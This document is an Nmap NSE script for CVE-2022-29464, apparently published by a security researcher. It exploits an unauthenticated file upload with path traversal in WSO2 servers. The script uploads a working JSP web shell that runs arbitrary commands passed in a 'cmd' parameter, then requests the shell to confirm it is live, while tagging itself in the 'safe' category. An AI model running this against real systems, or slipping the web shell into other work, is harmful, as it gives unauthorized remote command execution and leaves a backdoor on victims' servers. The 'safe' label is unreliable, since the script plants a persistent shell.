description = [[
  CVE-2022-29464
  Unauthorized and unrestricted arbitrary file transfer vulnerability that allows unauthenticated attackers to obtain RCEs on WSO2 servers by sending malicious JSP files. 
]]

---
-- @name
-- CVE-2022-29464 - Nse script for vulnerability CVE-2022-29464. Unauthorized and unrestricted arbitrary file transfer vulnerability that allows unauthenticated attackers to obtain RCEs on WSO2 servers by sending malicious JSP files. 
-- @author
-- Grzegorz Piechnik <@gpiechnik2>
-- @usage
-- nmap --script=./nmap-WSO2-CVE-2022-29464 <target>
-- @arguments
-- nmap-WSO2-CVE-2022-29464.path       relative uri (default: /fileupload/toolsAny)
-- nmap-WSO2-CVE-2022-29464.filename   filename (default: shell.jsp)
-- @output
-- PORT   STATE SERVICE
-- 80/tcp open  http
-- | nmap-WSO2-CVE-2022-29464:
-- |   VULNERABLE:
-- |   CVE-2022-29464
-- |     State: LIKELY VULNERABLE
-- |     IDs:  CVE:CVE-2022-29464
-- |     Check results:
-- |       127.0.0.1:8080/authenticationendpoint/shell.jsp
-- |     References:
-- |_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-29464
---

local http = require "http"
local stdnse = require "stdnse"
local shortport = require "shortport"
local vulns = require "vulns"
local string = require "string"

author = "Grzegorz Piechnik <bugspace DOT com>"
license = "Same as Nmap--See https://nmap.org/book/man-legal.html"
categories = {"default", "vuln", "safe", "CVE-2022-29464"}

-- We are only interested in http requests
portrule = shortport.http

action = function(host, port)

  -- local variables
  local path = stdnse.get_script_args(SCRIPT_NAME .. '.path') or '/fileupload/toolsAny'
  local filename = stdnse.get_script_args(SCRIPT_NAME .. '.filename') or 'shell.jsp'

  -- The vuln definition section
  local vuln = {
      title = "CVE-2022-29464",
      state = vulns.STATE.NOT_VULN, --default
      IDS = { CVE = 'CVE-2022-29464' }
  } 

  local report = vulns.Report:new(SCRIPT_NAME, host, port)

  local payload = [=[
    <FORM>
    <INPUT name='cmd' type=text>
    <INPUT type=submit value='Run'>
</FORM>
<%@ page import="java.io.*" %>
    <%
    String cmd = request.getParameter("cmd");
    String output = "";
    if(cmd != null) {
        String s = null;
        try {
            Process p = Runtime.getRuntime().exec(cmd,null,null);
            BufferedReader sI = new BufferedReader(new
InputStreamReader(p.getInputStream()));
            while((s = sI.readLine()) != null) { output += s+"</br>"; }
        }  catch(IOException e) {   e.printStackTrace();   }
    }
%>
        <pre><%=output %></pre>
  ]=]

  content = {
    ["../../../../repository/deployment/server/webapps/authenticationendpoint/" .. filename] = payload
  }

  if shortport.http(host, port) then

    -- After the payload is submitted, the server should stop working and the request should have no status
    stdnse.debug("Sending a constructed request")
    local response = http.generic_request(host, port.number, "POST", path, { content = content, no_cache = true })
    local status = response.status

    if status == nil then
      -- Something went really wrong out there
      -- According to the NSE way we will die silently rather than spam user with error messages
    else
      if status == 200 then
        vuln.state = vulns.STATE.LIKELY_VULN
        vuln.extra_info = host.ip .. ":" .. port.number .. "/authenticationendpoint/" .. filename
      end
    end

    -- Check if the shell transfer was successful
    stdnse.debug("Check if the shell transfer was successful")
    local response = http.generic_request(host, port.number, "GET", "authenticationendpoint/" .. filename, { no_cache = true })
    local status = response.status
    local response_body = response.body

    if status == nil then
      -- Something went really wrong out there
      -- According to the NSE way we will die silently rather than spam user with error messages
    else
      if status == 200 then
        if string.find(response_body, "Run") then
          vuln.state = vulns.STATE.VULN
          vuln.extra_info = host.ip .. ":" .. port.number .. "/authenticationendpoint/" .. filename
        else
          vuln.state = vulns.STATE.LIKELY_VULN
          vuln.extra_info = host.ip .. ":" .. port.number .. "/authenticationendpoint/" .. filename
        end
      end
    end

    return report:make_output(vuln)
  end
end